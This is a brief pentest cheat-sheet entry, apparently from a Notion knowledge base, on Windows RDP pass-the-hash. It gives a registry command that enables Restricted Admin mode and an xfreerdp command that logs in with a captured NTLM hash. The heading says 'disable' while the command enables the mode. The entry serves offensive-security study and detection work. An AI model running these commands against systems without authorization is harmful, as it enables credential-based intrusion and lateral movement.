# RDP Pass the Hash (Disable Restricted Admin Mode)

OS: Windows
Description: Enable Restricted Admin Mode: Allow network logon instead of password based. 
Security Domains: Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)
Target_Technology: rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21)
URL: https://www.blumira.com/blog/2024-apr-why-are-threat-actors-enabling-windows-restrictedadmin-mode

### RDP Pass the hash

- Disable Restricted Admin

```jsx
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Now we can use acquired hash to RDP:

```jsx
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```